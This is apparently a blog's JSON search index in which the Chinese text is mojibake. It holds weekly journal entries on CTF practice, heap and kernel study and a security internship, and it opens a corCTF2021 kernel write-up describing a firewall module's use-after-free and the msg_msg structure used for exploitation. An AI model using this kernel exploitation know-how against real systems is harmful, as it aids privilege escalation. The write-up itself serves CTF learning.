[{"categories":["Life"],"content":"æ™®æ™®é€šé€šçš„å‘¨æŠ¥ Keep going, never stop. ç¶šã‘ã¦ã€æ­¢ã¾ã‚‰ãªã„ã€‚ ","date":"0001-01-01","objectID":"/jounal/:0:0","series":null,"tags":["Journal"],"title":"Niebelungenã®journal","uri":"/jounal/#"},{"categories":["Life"],"content":"Niebelungenã®journal","date":"0001-01-01","objectID":"/jounal/:0:0","series":null,"tags":["Journal"],"title":"Niebelungenã®journal","uri":"/jounal/#niebelungenã®journal"},{"categories":["Life"],"content":"2021-3.1~3.7 Glibc-2.20-malloc review IDApython learning å­¦ä¹ äº†åŸºç¡€çš„MIPSæŒ‡ä»¤ä¸å‡½æ•°è°ƒç”¨ï¼Œä½¿ç”¨IDApythonå¯ä»¥å®ç°å¯¹æ•æ„Ÿå‡½æ•°åŠå…¶å‚æ•°æ ‡è¯†ï¼Œä½†æ˜¯å‚æ•°æº¯æºåŠŸèƒ½è¿˜æ˜¯æœ‰å¾ˆå¤šçš„bugã€‚ä¸‹å‘¨ç»§ç»­å­¦ä¹ ing ","date":"0001-01-01","objectID":"/jounal/:1:0","series":null,"tags":["Journal"],"title":"Niebelungenã®journal","uri":"/jounal/#2021-3137"},{"categories":["Life"],"content":"2021-3.8~3.14 IDApython learning æ‘¸äº†NahamCon CTF æ‘¸äº†V\u0026N CTF å¤§å¤±è´¥å•Šï¼Œä¸€å¤©åšäº†ä¸¤ä¸ªeasyï¼Œè¿˜æ˜¯è¦åˆ·é¢˜å•Šã€‚ ","date":"0001-01-01","objectID":"/jounal/:2:0","series":null,"tags":["Journal"],"title":"Niebelungenã®journal","uri":"/jounal/#2021-38314"},{"categories":["Life"],"content":"2021-3.15~3.21 How2heap-Glibc-2.23 FIDLåç¼–è¯‘å±‚APIå­¦ä¹  NepCTF è‡ªå·±çš„ä¸è¶³è¿˜æ˜¯å¾ˆå¤šçš„ï¼Œä¸‹å‘¨å¸Œæœ›èƒ½æŠ•å…¥æ›´å¤šçš„ç²¾åŠ›åˆ°åšé¢˜ä¸Šï¼Œå¤šåŠ ç»ƒä¹ ã€‚ ","date":"0001-01-01","objectID":"/jounal/:3:0","series":null,"tags":["Journal"],"title":"Niebelungenã®journal","uri":"/jounal/#2021-315321"},{"categories":["Life"],"content":"2021-3.22~3.28 How2heap-Glibc-2.27 \u0026 Glibc-2.31 CodeQL åˆå­¦ CodeQLå¾ˆå¼ºï¼Œä½†æ˜¯è¿™æ¬¡åªæ˜¯å­¦äº†ä¸€äº›åŸºæœ¬çš„è¯­æ³•å’Œæ•°æ®æµã€‚ä»¥åæœ‰æœºä¼šå†æ·±å…¥å­¦ä¹ æ¼æ´æ¨¡å¼ã€‚åšäº†ä¸€äº›PWNçš„ç»ƒä¹ é¢˜ï¼Œä½†æ˜¯å¾ˆå¤šéƒ½æ˜¯å·²ç»æŒæ¡çš„åˆ©ç”¨æ–¹å¼ï¼Œåªèƒ½å½“æˆå·©å›ºäº†ã€‚ ç»™æ–°ç”Ÿèµ›å‡ºäº†å‡ ä¸ªç­¾åˆ°é¢˜ï¼Œå­¦ä¹ äº†ä¸€ä¸‹gccçš„ä¿æŠ¤é€‰é¡¹ã€‚ ","date":"0001-01-01","objectID":"/jounal/:4:0","series":null,"tags":["Journal"],"title":"Niebelungenã®journal","uri":"/jounal/#2021-322328"},{"categories":["Life"],"content":"2021-3.29~4.4 Unixç¯å¢ƒç¼–ç¨‹ï¼Œå¯¹è¿›ç¨‹ã€çº¿ç¨‹å’Œä¿¡å·ç­‰é‡ç‚¹å­¦ä¹ äº†ã€‚ è™ç¬¦ å®‰æ’ä¸‰æœˆèµ› ç°åœ¨æ‰“è¿™ç§è™ç¬¦ctfï¼Œå¯¹åƒæˆ‘è¿™æ ·åŸºç¡€çš„pwnæ‰‹æ¥è¯´å¾ˆä¸å‹å¥½ğŸ˜¥ï¼Œæˆ‘æ²¡æœ‰ä¸€ä¸ªæ·±å…¥çš„æ–¹å‘ã€‚Reé€†å‘èƒ½åŠ›æœ‰å¾…æå‡ï¼Œè¦å­¦ä¹ åŠ å¯†ä¸è§£å¯†ã€‚ ","date":"0001-01-01","objectID":"/jounal/:5:0","series":null,"tags":["Journal"],"title":"Niebelungenã®journal","uri":"/jounal/#2021-32944"},{"categories":["Life"],"content":"2021-4.5~4.11 ç–¯ç‹‚çš„åˆ·é¢˜ angstromctf 2021ç¢°åˆ°å‡ ä¸ªå¾ˆæœ‰è¶£çš„æ€è·¯ å¤ç°äº†å‰å‡ å‘¨æ²¡åšå‡ºæ¥çš„æ¯”èµ›é¢˜ å¤ç°äº†ä¸€ä¸ªHTBçš„wpï¼ˆæ–¹ç­æ‘¸é±¼ï¼‰ï¼Œä¾ç„¶åœ¨ç ”ç©¶èƒ½å­¦åˆ°å¾ˆå¤šä¸œè¥¿ã€‚ å¤©é—®çš„ä»»åŠ¡æœ‰ç‚¹æ‹‰ä¸‹äº†ï¼Œæœ€è¿‘è¿˜æœ‰å¾ˆå¤šçš„ä½œä¸šğŸ˜¥ ","date":"0001-01-01","objectID":"/jounal/:6:0","series":null,"tags":["Journal"],"title":"Niebelungenã®journal","uri":"/jounal/#2021-45411"},{"categories":["Life"],"content":"2021-4.12~4.18 ç–¯ç‹‚çš„åˆ·é¢˜ ä»£ç å®¡è®¡ pythonçš„åƒåœ¾å›æ”¶æœºåˆ¶ ä»£ç å®¡è®¡çš„è‰ºæœ¯yydsï¼ ","date":"0001-01-01","objectID":"/jounal/:7:0","series":null,"tags":["Journal"],"title":"Niebelungenã®journal","uri":"/jounal/#2021-412418"},{"categories":["Life"],"content":"2021-4.19~4.25 ç–¯ç‹‚çš„åˆ·é¢˜ pythonçš„åƒåœ¾å›æ”¶æœºåˆ¶review ï¼Ÿæ€ä¹ˆæ„Ÿè§‰è¿™å‘¨ä»€ä¹ˆéƒ½æ²¡å¹²ï¼Ÿï¼Ÿå¤šäº†ä¸¤é—¨è¯¾å¤´å¤§ ","date":"0001-01-01","objectID":"/jounal/:8:0","series":null,"tags":["Journal"],"title":"Niebelungenã®journal","uri":"/jounal/#2021-419425"},{"categories":["Life"],"content":"2021-4.26~5.02 åˆ·é¢˜ æ‘¸é±¼å¤ªç‹ äº†ï¼Œå·²ç»å¿˜äº†è‡ªå·±å¹²è¿‡ä»€ä¹ˆäº†~~ å¬äº†ä¸€äº›å­¦é•¿çš„çœ‹æ³•ï¼Œå¦‚æœæƒ³è¦ç›´æ¥å°±ä¸šçš„è¯ï¼Œè¿˜æ˜¯è¦å°½æ—©å»å®ä¹ ã€‚æˆ‘æ€»è§‰å¾—æˆ‘ç°åœ¨çš„æŠ€æœ¯èƒ½åŠ›å¹¶ä¸çŸ¥é“ä¼šæœ‰ä»€ä¹ˆå…¬å¸è¦æˆ‘ã€‚å¦å¤–ï¼Œè¶Šæ¥è¶Šè§‰å¾—CTFå¹¶ä¸èƒ½æ‰“ä¸€è¾ˆå­ï¼Œè¿˜æ˜¯è¦å°½å¿«è½¬åˆ°æ¼æ´æŒ–æ˜çš„å®æˆ˜ä¸­ã€‚å…¬å¸é¢è¯•çš„æ—¶å€™éƒ½è¦æ±‚åœ¨CTFä¸­å–å¾—ä¸€å®šæˆç»©ï¼Œç°åœ¨æˆ‘ä¹Ÿæ˜¯å¾ˆæƒ³æ‰“å‡ºä¸€å®šçš„æˆç»©åå†é€€å½¹çš„ï¼Œè‡³å°‘è¦è¿›è¿‡çº¿ä¸‹ã€‚å•Šï¼Œè¦å­¦çš„ä¸œè¥¿å¤ªå¤šäº†ï¼ˆä¸æƒ³ä¸Šå­¦äº†å‘œå‘œå‘œ~ å¤©é—®é‚£è¾¹æœ€è¿‘åˆ’æ°´äº†ï¼Œè¦å°½å¿«è·Ÿä¸Šã€‚ ","date":"0001-01-01","objectID":"/jounal/:9:0","series":null,"tags":["Journal"],"title":"Niebelungenã®journal","uri":"/jounal/#2021-426502"},{"categories":["Life"],"content":"2021-5.03~5.09 åˆ·é¢˜ åŠ å…¥NaN å¸¦æˆ‘çš„å­¦é•¿å¾ˆå¤šéƒ½å»è€ƒç ”äº†ï¼ŒKirinæˆ‘ä¹Ÿæ²¡æ€ä¹ˆå’Œä»–äº¤æµï¼Œé—®é¢˜æ€ªä¸å¥½æ„æ€çš„ï¼Œç°åœ¨åªèƒ½æ…¢æ…¢æ‘¸ç´¢äº† æ´¥é—¨æ¯\u0026çº¢å¸½æ¯ ç¬¬ä¸€æ¬¡ä½“ä¼šåˆ°ä¸€èµ·åšé¢˜çš„å¿«ä¹ï¼Œå¤ªçˆ½äº†ï¼Œå¸ˆå‚…ä»¬éƒ½å¾ˆæ£’ï¼è™½ç„¶æ²¡æœ‰è¿›çº¿ä¸‹ï¼Œç”µè„‘è¿˜è¿›æ°´äº†ï¼ˆå€Ÿçš„ç”µè„‘ä¸´æ—¶æ­ç¯å¢ƒåšé¢˜ï¼‰ï¼Œä½†æ˜¯rank37è·ç¦»çº¿ä¸‹å·²ç»å¾ˆè¿‘äº†ï¼ŒåŠ æ²¹ï¼ è¿™å‘¨å’Œä¸‹å‘¨æ˜¯æœ‰å¾ˆå¤šè€ƒè¯•ï¼ŒçœŸçš„è¦æ­»äº†~ ","date":"0001-01-01","objectID":"/jounal/:10:0","series":null,"tags":["Journal"],"title":"Niebelungenã®journal","uri":"/jounal/#2021-503509"},{"categories":["Life"],"content":"2021-5.10~5.16 åˆ·é¢˜ ç®€å•çš„æ­å»ºäº†ä¸€ä¸ªå¼‚æ„æ±‡ç¼–çš„è¿è¡Œè°ƒè¯•ç¯å¢ƒï¼Œè¿˜å°è¯•äº†ä½¿ç”¨vscode sshè¿œç¨‹åšé¢˜ å‚åŠ å›½èµ› é¢˜ç›®æ¯”å»å¹´éš¾äº†ä¸€ç‚¹ï¼Œé˜´é—´çš„å †é£æ°´ï¼Œé˜´é—´çš„æ¯”èµ›æ—¶é—´ï¼ˆä¸‰å¼ è¯•å·ï¼Ÿå†²åˆºå·ï¼Ÿå®æè¿™é«˜è€ƒå‘¢ï¼Ÿ ","date":"0001-01-01","objectID":"/jounal/:11:0","series":null,"tags":["Journal"],"title":"Niebelungenã®journal","uri":"/jounal/#2021-510516"},{"categories":["Life"],"content":"2021-5.17~5.23 ä¸‰å¤©å¤ä¹ ç®—æ³• ä¸¤å¤©å­¦å®Œé›†åˆè®ºä¸å›¾è®º åœ¨å­¦é™¢æåº¦åˆç†çš„æ´»åŠ¨å®‰æ’ä¸‹ï¼Œè®©æˆ‘æœ‰äº†é‚£ä¹ˆå¤šçš„å¤ä¹ æ—¶é—´ï¼ŒçœŸæ˜¯å¤ªæ£’äº†ï¼ï¼ˆä»€ä¹ˆåƒåœ¾ï¼Œèµ¶å¿«çˆ¬å¥½å— æ­å»ºAFLæºç è°ƒè¯•ç¯å¢ƒ å¼€å§‹é˜…è¯»AFLæºç äº†ï¼Œç”µè„‘ä¾æ—§åï¼ŒçœŸæ˜¯éš¾å—ã€‚ç°åœ¨çœ‹äº†afl-gccçš„éƒ¨åˆ†ï¼Œä»£ç å†™çš„æ¡ç†å¾ˆæ¸…æ™°ã€‚ æš‘æœŸå®ä¹ get æ²¡æƒ³åˆ°çœŸçš„é€šè¿‡äº†ï¼Œå¤ªå¥½äº†ï¼Œä¸æ˜¯æ²¡äººè¦äº†å‘œå‘œå‘œ~ ","date":"0001-01-01","objectID":"/jounal/:12:0","series":null,"tags":["Journal"],"title":"Niebelungenã®journal","uri":"/jounal/#2021-517523"},{"categories":["Life"],"content":"2021-5.24~5.30 ä¸€å‘¨ä¸‰æ¬¡å®éªŒ æ˜¥ç§‹æ¯-æˆ˜é˜Ÿè€ƒæ ¸ è™½ç„¶æ˜¯è€ƒæ ¸ï¼Œä½†æ˜¯å¤ªéš¾äº†æ ¹æœ¬æ²¡äººåšå‡ºæ¥ã€‚ã€‚ã€‚ DASCTF-May å®‰æ’çš„æœˆèµ›ï¼Œä¸¤é“åŸºç¡€çš„heapï¼Œakäº† è°ƒè¯•fmtæ¼æ´ æŒºè¿‡æ­»äº¡è€ƒè¯•å‘¨ï¼Œæ‘¸é±¼äº†ï¼ˆ ","date":"0001-01-01","objectID":"/jounal/:13:0","series":null,"tags":["Journal"],"title":"Niebelungenã®journal","uri":"/jounal/#2021-524530"},{"categories":["Life"],"content":"2021-5.31~6.06 uCore-Tiny Kernel Learing sakuraçš„ä»»åŠ¡ç½¢äº†ï¼Œè™½ç„¶å¿«è¦è€ƒè¯•äº†ï¼Œä½†æ˜¯å†™å†…æ ¸è¿™ä¹ˆé…·çš„äº‹è°èƒ½æ‹’ç»å‘¢ï¼Ÿï¼ˆ NEWSCTF ä¸‰é“pwné¢˜ï¼Œbaby_heap+fmt+orwheapï¼Œéƒ½æ˜¯æœ€è¿‘è§è¿‡çš„æ€è·¯ï¼Œakäº† ","date":"0001-01-01","objectID":"/jounal/:14:0","series":null,"tags":["Journal"],"title":"Niebelungenã®journal","uri":"/jounal/#2021-531606"},{"categories":["Life"],"content":"2021-6.07~6.13 ç»§ç»­å†™å†…æ ¸ å¼ºç½‘æ¯ è‡ªé—­äº†ï¼Œç®€å•é¢˜éƒ½æ²¡åšå‡ºæ¥ã€‚è™½ç„¶éƒ½èƒ½æ‰¾å‡ºæ¥æ´ï¼Œä½†æ˜¯åˆ©ç”¨æ€è·¯å´æƒ³ä¸åˆ°ï¼Œå¿ƒæ€æœ‰ç‚¹é—®é¢˜ : ( ","date":"0001-01-01","objectID":"/jounal/:15:0","series":null,"tags":["Journal"],"title":"Niebelungenã®journal","uri":"/jounal/#2021-607613"},{"categories":["Life"],"content":"2021-6.14~6.20 å†…æ ¸-lab2 å›½èµ›åˆ†åŒºèµ› ç¬¬ä¸€æ¬¡AWDæ¯”èµ›ï¼Œç¼ºå°‘å¾ˆå¤šç»éªŒï¼Œå¤§éƒ¨åˆ†çš„é¢˜ç›®éƒ½æ˜¯é€šè¿‡æµé‡è½¬å‘å‡ºæ¥çš„ï¼Œè€Œè‡ªå·±èƒ½patchæ­£ç¡®çš„å¾ˆå°‘ ","date":"0001-01-01","objectID":"/jounal/:16:0","series":null,"tags":["Journal"],"title":"Niebelungenã®journal","uri":"/jounal/#2021-614620"},{"categories":["Life"],"content":"2021-6.21~6.27 å¼€å§‹ä¸Šç­ï¼ˆxxxï¼‰ å‡†å¤‡è€ƒè¯•å‘¨ ","date":"0001-01-01","objectID":"/jounal/:17:0","series":null,"tags":["Journal"],"title":"Niebelungenã®journal","uri":"/jounal/#2021-621627"},{"categories":["Life"],"content":"2021-6.28~7.04 GKCTF ç®€å•çš„md5éƒ½æ²¡çœ‹å‡ºæ¥ ","date":"0001-01-01","objectID":"/jounal/:18:0","series":null,"tags":["Journal"],"title":"Niebelungenã®journal","uri":"/jounal/#2021-628704"},{"categories":["Life"],"content":"2021-7.05~7.11 0CTF ä¸€åœºå¾ˆå¥½çš„å›½é™…èµ›ï¼Œçœ‹äº†ä¸¤é“ç®€å•é¢˜abs8()æ²¡çœ‹å‡ºæ¥ï¼Œä¹Ÿç¬¬ä¸€æ¬¡å¬è¯´äº†muslï¼Œç°å­¦æºç å†™äº†ä¸€åŠçš„åˆ©ç”¨ï¼Œå¯æƒœè¦è€ƒè¯•æä¸æ‡‚äº†ã€‚ å‡†å¤‡æ•™å­¦è¯¾ä»¶ ä¸ç¤¾å›¢åŠäº†ä¸€ä¸ªåˆ›æ–°è¯¾ï¼Œè‡ªå·±è®²è¿°äºŒè¿›åˆ¶ç›¸å…³å†…å®¹ã€‚ æ‘¸é±¼çœ‹äº†çœ‹ctfshowçš„æ¯”èµ›ã€‚ ","date":"0001-01-01","objectID":"/jounal/:19:0","series":null,"tags":["Journal"],"title":"Niebelungenã®journal","uri":"/jounal/#2021-705711"},{"categories":["Life"],"content":"2021-6.21~9.20è¿™æ˜¯æˆ‘çš„å®ä¹ æœŸé—´ã€‚å¯ä»¥è¯´æˆ‘å—åˆ°äº†ç»„é•¿å’ŒåŒäº‹æå¤§çš„ç…§é¡¾ï¼Œç»„é•¿ç»å¸¸å«æˆ‘å»å­¦ä¹ ï¼ŒåŒäº‹ä¹Ÿå¯¹æˆ‘çš„ä¸æ–­çš„æé—®éƒ½ç»™äº†å›å¤ã€‚ æˆ‘åšçš„ä¸»è¦å·¥ä½œå°±æ˜¯å¤ç°å’Œåˆ†æç»„é•¿ç»™æˆ‘çš„cveçš„pocï¼Œè¿™äº›éƒ½æ˜¯å¾®è½¯æä¾›çš„ï¼Œå±äºä¿å¯†äº‹é¡¹ã€‚å¯¹äºæˆ‘ä»æ¥æ²¡æœ‰æ¥è§¦è¿‡windowsçš„äººæ¥è¯´ï¼Œè¿™æ˜¯ä¸€ä¸ªå·¨å¤§çš„æŒ‘æˆ˜ã€‚æˆ‘é€šè¿‡é˜…è¯»å¤§é‡çš„è‹±æ–‡èµ„æ–™å’Œè¿›è¡Œç—›è‹¦çš„è°ƒè¯•å­¦ä¹ äº†å¾ˆå¤šçŸ¥è¯†ï¼Œä¹Ÿè®¤è¯†åˆ°äº†windowsçš„å¤æ‚ã€‚å¦ä¸€æ–¹é¢çš„å·¥ä½œæ˜¯å°†ä¸€äº›windowsçš„fuzzå·¥å…·è¿›è¡Œæµ‹è¯•ã€‚å³ç”¨æˆ‘å­¦ä¹ çš„cveä½œä¸ºç›®æ ‡æ¥å®éªŒã€‚è¿™æ˜¯éå¸¸éº»çƒ¦çš„äº‹ï¼Œæˆ‘ä½¿ç”¨çš„ç¬¬ä¸€ä¸ªå·¥å…·éå¸¸çš„å¤è€ï¼Œä»¥è‡´äºä¸æ”¯æŒæˆ‘çš„ç›®æ ‡ã€‚ç¬¬äºŒä¸ªå·¥å…·ï¼ŒWTFæ˜¯ä¸€ä½éå¸¸æœ‰åçš„é€†å‘å·¥ç¨‹å¸ˆå†™çš„ã€‚æˆ‘è§‰å¾—ä»–çš„æ€è·¯éå¸¸å¥½ã€‚ç°åœ¨è¿™ä¸ªå·¥å…·å·²ç»åˆ°è¾¾äº†0.2ç‰ˆæœ¬ï¼Œè¿›è¡Œäº†å¾ˆå¤šçš„æ›´æ–°ã€‚å„ä½æ„Ÿå…´è¶£å¯ä»¥çœ‹çœ‹ã€‚ ","date":"0001-01-01","objectID":"/jounal/:20:0","series":null,"tags":["Journal"],"title":"Niebelungenã®journal","uri":"/jounal/#2021-621920"},{"categories":["Life"],"content":"Reæˆ‘å¾ˆä¹…éƒ½æ²¡æœ‰å†™å‘¨æŠ¥ï¼ŒåŸå› ä¹‹ä¸€æ˜¯åœ¨ç»“æŸå®ä¹ åï¼Œæˆ‘å¤–å‡ºå‚åŠ äº†å¾ˆå¤šçš„æ¯”èµ›ã€‚ç¬¬äºŒç‚¹æ˜¯æˆ‘å¯¹å°†æ¥æ˜¯å·¥ä½œè¿˜æ˜¯è€ƒç ”é™·å…¥äº†è¿·èŒ«ã€‚ åœ¨æˆ‘å®ä¹ é˜¶æ®µï¼Œæˆ‘ä¸ç»„é•¿èŠè¿‡è¿™ä¸ªé—®é¢˜ã€‚å¥¹çœ‹å‡ºæ¥æˆ‘å¸Œæœ›å¾—åˆ°æŠ€æœ¯çš„æå‡ï¼Œä½†æ˜¯å‘Šè¯‰æˆ‘å¦‚æœæƒ³è¦è¶…è¶Šé‚£äº›å¾ˆå‰å®³çš„äººåŸºæœ¬æ˜¯ä¸å¯èƒ½äº†ï¼Œä»–ä»¬å¾ˆæ—©å°±æ¥è§¦å­¦ä¹ è¿™æ–¹é¢çš„çŸ¥è¯†ã€‚æ‰€ä»¥åŠæˆ‘è€ƒç ”ã€‚ç»„é•¿å·²ç»è¿›å…¥ç¤¾ä¼šå¾ˆä¹…äº†ï¼Œå¥¹ç»™æˆ‘è®²äº†è®²ç ”ç©¶ç”Ÿçš„å¥½å¤„ã€‚æ€»ç»“æ¥è¯´å°±æ˜¯æœ‰ç€æ›´é«˜çš„ç¤¾ä¼šè®¤å¯åº¦ï¼Œè¿™ä¸ªå¯ä»¥è®©ä½ åœ¨ç”Ÿæ´»çš„å¾ˆå¤šæ–¹é¢æœ‰ç€ä¼˜åŠ¿ï¼Œæ¯”å¦‚åœ¨åŒ—äº¬æˆ–è€…å…¶ä»–å¤–åœ°ç”Ÿæ´»ã€‚ skrå¸ˆå‚…è¯´ï¼Œè¯»ä¹¦å¯ä»¥å¤šç‚¹é€‰æ‹©ï¼Œä½†æ˜¯ä¸èƒ½æ”¾å¼ƒæŠ€æœ¯ï¼Œå»ºè®®ä¸¤æ‰‹å‡†å¤‡ã€‚æˆ‘æ¯”è¾ƒè®¤åŒï¼Œæ‰€ä»¥æˆ‘æ­£æ‰“ç®—è¿™æ ·åšã€‚ æ‰€ä»¥ï¼Œåœ¨é•¿è¾¾è¿‘å››ä¸ªæœˆåï¼Œæˆ‘åˆåœ¨è¿™é‡Œå†™äº†ä¸€äº›ä¸œè¥¿ã€‚ä¹‹åè¿™ä¸ªåšå®¢ä¸ä¼šè¢«æ”¾å¼ƒï¼Œä½†æ˜¯æ›´æ–°çš„é¢‘ç‡å¯èƒ½æ˜¯ä¸å®šæœŸã€‚ Is this a compromise of life or another way to get closer to the ideal? ","date":"0001-01-01","objectID":"/jounal/:0:0","series":null,"tags":["Journal"],"title":"Niebelungenã®journal","uri":"/jounal/#re"},{"categories":["Life"],"content":"? ~2022-6.13Hi, itâ€™s been a long time. Now, I have finished most of my junior year and from now on I will focus on preparing for the postgraduate examination. I want to record some thoughts. Rust: Yeah, I have learned some Rust in the past few weeks. Itâ€™s a very amazing program language. As the author says â€œRust makes aggressive bets.â€ in the Rust Book. Some concepts are not easy to adapt, but Rust believes itâ€™s worthy. Usually, performance will lose when you pursuit high security. I changed my view since I know Rust could generate almost same assembly code as c! This means it has the potential to achieve high performance while pursuing high security! Rust might change the world, Iâ€™m looking forward it! Kernel Pwn: Recently, I find some kernel challenge is boring. Actually, most kernel challenges focus on exploiting methods while finding a bug is really point in kernel bug hunting. If you want to be good at kernel pwn, you should know the kernel well. So why not pay more attention to learning kernel instead of ctf challenges. And I find in Virtual Machine, ubuntu will open some mitigation which caused I canâ€™t read fd_array. I still donâ€™t figure out it. Funny blog: Cybersecurity education in my school is shit! I found some helpful bolg as followed: Python VM: use Python to implement a CPU which has melt down. In this write-up, you will understand how melt down in CPU works clearly! Breaking-The-x86-ISA: Do the secret instructions exist in x86 instructions set? X86 is CISV, some bit combinations are not documented in the manual. If they could be run, they are maybe the hidden instructions. The author used a great method to find them and he really got some funny results. Insert-backdoor-into-compilerï¼šIt is possible to compile programs with backdoors using a compiler with a backdoor. So when the compiler compiles its own normal code (without adding the backdoor), how do you get it to complete the bootstrap? ","date":"0001-01-01","objectID":"/jounal/:1:0","series":null,"tags":["Journal"],"title":"Niebelungenã®journal","uri":"/jounal/#-2022-613"},{"categories":["Writeups"],"content":"Spark","date":"2022-04-08","objectID":"/hitcon2020-spark/:0:0","series":null,"tags":["Writeups","Kernel"],"title":"HITCON2020 Spark","uri":"/hitcon2020-spark/#spark"},{"categories":["Writeups"],"content":"corCTF2021-msg_msgåœ¨D^3CTF2022ä¸­çš„d3kheapï¼Œçœ‹ä¸Šå»æ˜¯æ¯”è¾ƒç®€å•çš„ä¸€é“é¢˜ç›®ï¼Œæˆ‘ï¼ˆA Linux kernel newbieï¼‰ä¸€ç›´è‹¦äºå¦‚ä½•leakå†…æ ¸åœ°å€ä¿¡æ¯ã€‚åœ¨official writepä¸­æåˆ°äº†msg_msgå¯ä»¥leakã€‚æ‰€ä»¥æˆ‘å°±å»æ‰¾äº†ç›¸å…³çš„èµ„æ–™ï¼Œå‘ç°äº†è¿™ä¸¤ä¸ªé¢˜ç›® corCTF2021 çš„ Fire-of-Salvation å’Œ Wall-of-Perdition ã€‚è¿™ä¸¤ä¸ªé¢˜ç›®æ˜¯ä¸€ä¸ªç³»åˆ—ï¼Œå‰è€…ä¸ºç®€å•æ¨¡å¼ï¼Œåè€…ä¸ºå›°éš¾æ¨¡å¼ã€‚æ¯”èµ›ä¸­ä¸ºé›¶è§£ï¼Œä½œè€…åœ¨åšå®¢ä¸­ä½¿ç”¨ msg_msg ç»“æ„æ„é€ äº†å†…æ ¸ä»»æ„åœ°å€è¯»å†™åŸè¯­ã€‚ é¢˜ç›®Githubä»“åº“ï¼š corCTF-2021-public-challenge-archive/pwn at main Â· Crusaders-of-Rust/corCTF-2021-public-challenge-archive ","date":"2022-03-18","objectID":"/corctf2021-msg_msg/:0:0","series":null,"tags":["Writeups","Kernel"],"title":"CorCTF2021 Msg_msg","uri":"/corctf2021-msg_msg/#corctf2021-msg_msg"},{"categories":["Writeups"],"content":"ç¨‹åºåˆ†æä¸¤ä¸ªé¢˜ç›®éƒ½å®ç°äº†Netfilter hooksï¼Œå¯ä»¥å¯¹å†…æ ¸æ”¶åˆ°ç½‘ç»œæ•°æ®åŒ…è¿›è¡Œå›è°ƒå¤„ç†ã€‚ä½†æ˜¯ä¸æœ¬é¢˜åˆ©ç”¨æ— å…³ï¼Œæ›´è¯¦ç»†çš„çŸ¥è¯†å¯ä»¥çœ‹ä¸‹é¢çš„åšå®¢ï¼š Linux Kernel Communicationâ€Š-â€ŠNetfilter Hooks æ¨¡å—å®ç°äº†5ä¸ªåŠŸèƒ½ï¼š firewall_add_rule ï¼šæ·»åŠ ä¸€æ¡è§„åˆ™åˆ°æŒ‡å®šçš„å…¥ç«™/å‡ºæˆ˜çš„å…¨å±€çš„é“¾è¡¨ä¸­ firewall_delete_rule ï¼šä»æŒ‡å®šçš„é“¾è¡¨ä¸­åˆ é™¤ä¸€æ¡è§„åˆ™ï¼Œå¯¹åº”ä½ç½®ç½®ç©º firewall_edit_rule ï¼šä¿®æ”¹æŸä¸€é“¾è¡¨ä¸­çš„è§„åˆ™ firewall_show_rule ï¼šæœªå®ç°å…·ä½“åŠŸèƒ½ firewall_dup_rule ï¼šå°†ä¸€ä¸ªé“¾è¡¨ä¸Šçš„è§„åˆ™å¤åˆ¶åˆ°å¦ä¸€ä¸ªé“¾è¡¨ä¸Šç¬¬ä¸€ä¸ªä¸ºç©ºçš„ä½ç½®ï¼Œå‰¯æœ¬è§„åˆ™çš„ is_duplicated å­—æ®µç½®ä¸º1 è¿™å®é™…ä¹Ÿæ˜¯ä¸€ä¸ªèœå•é¢˜ã€‚å…¥ç«™å’Œå‡ºç«™çš„è§„åˆ™ç”¨ä¸¤ä¸ªå…¨å±€æŒ‡é’ˆç»´æŠ¤ï¼š rule_t **firewall_rules_in; rule_t **firewall_rules_out; rule_tç»“æ„ä½“å¦‚ä¸‹ï¼š #ifdef EASY_MODE #define DESC_MAX 0x800 #endif typedef struct { char iface[16]; char name[16]; char ip[16]; char netmask[16]; uint8_t idx; uint8_t type; uint16_t proto; uint16_t port; uint8_t action; #ifdef EASY_MODE char desc[DESC_MAX]; #endif } user_rule_t; typedef struct { char iface[16]; char name[16]; uint32_t ip; uint32_t netmask; uint16_t proto; uint16_t port; uint8_t action; uint8_t is_duplicated; #ifdef EASY_MODE char desc[DESC_MAX]; #endif } rule_t; åœ¨ EASY_MODE ä¸‹ï¼Œrule_t ç»“æ„å¤§å°ä¸º0x830ï¼Œè¯¥å†…å­˜ä¼šä»kmalloc-4096ä¸­å–å‡ºï¼Œè€Œå›°éš¾æ¨¡å¼ä¸‹ï¼Œrule_t çš„ç»“æ„ä½“å¤§å°åªæœ‰ 0x30 å­—èŠ‚ï¼Œè¯¥å†…å­˜ä¼šä»kmalloc-64ä¸­å–å‡ºã€‚è¿™ä¹Ÿæ˜¯ä¸¤ä¸ªé¢˜ç›®å”¯ä¸€çš„åŒºåˆ«äº†ã€‚ æ¨¡å—çš„æ¼æ´åœ¨äºï¼Œdeleteä¸€ä¸ªé“¾ä¸Šçš„è§„åˆ™åï¼Œå¹¶ä¸ä¼šå°†å…¶å‰¯æœ¬è¿›è¡Œfreeã€‚ä»è€Œæ„æˆäº†UAFã€‚ CONFIG_SLAB=y CONFIG_SLAB_FREELIST_RANDOM=y CONFIG_SLAB_FREELIST_HARDEN=y CONFIG_STATIC_USERMODEHELPER=y CONFIG_STATIC_USERMODEHELPER_PATH=\"\" CONFIG_FG_KASLR=y SMEP, SMAP, and KPTI are of course on. Note that this is an easier variation of the Wall of Perdition challenge. å†…æ ¸ä½¿ç”¨SLAB åˆ†é…å™¨ï¼Œå¼€å¯äº†freelistä¿æŠ¤ï¼Œä¸”modprobe_pathä¸å¯å†™ï¼Œè¿˜å¼€å¯äº†FG_KASLRã€‚ ","date":"2022-03-18","objectID":"/corctf2021-msg_msg/:1:0","series":null,"tags":["Writeups","Kernel"],"title":"CorCTF2021 Msg_msg","uri":"/corctf2021-msg_msg/#ç¨‹åºåˆ†æ"},{"categories":["Writeups"],"content":"å†…æ ¸IPC â€”â€” msgsnd()ä¸msgrcv()æºç åˆ†æä»‹ç»ï¼šå†…æ ¸æä¾›äº†ä¸¤ä¸ªsyscallæ¥è¿›è¡ŒIPCé€šä¿¡ï¼ŒÂ msgsnd()Â å’ŒÂ msgrcv()ï¼Œå†…æ ¸æ¶ˆæ¯åŒ…å«ä¸¤ä¸ªéƒ¨åˆ†ï¼Œæ¶ˆæ¯å¤´Â msg_msgÂ ç»“æ„å’Œç´§è·Ÿçš„æ¶ˆæ¯æ•°æ®ã€‚é•¿åº¦ä»kmalloc-64Â åˆ°Â kmalloc-4096ã€‚æ¶ˆæ¯å¤´Â msg_msgÂ ç»“æ„å¦‚ä¸‹æ‰€ç¤ºã€‚ struct msg_msg { struct list_head m_list; long m_type; size_t m_ts; /* message text size */ struct msg_msgseg *next; void *security; // securityæŒ‡é’ˆæ€»ä¸º0ï¼Œå› ä¸ºæœªå¼€å¯SELinux /* the actual message follows immediately */ }; 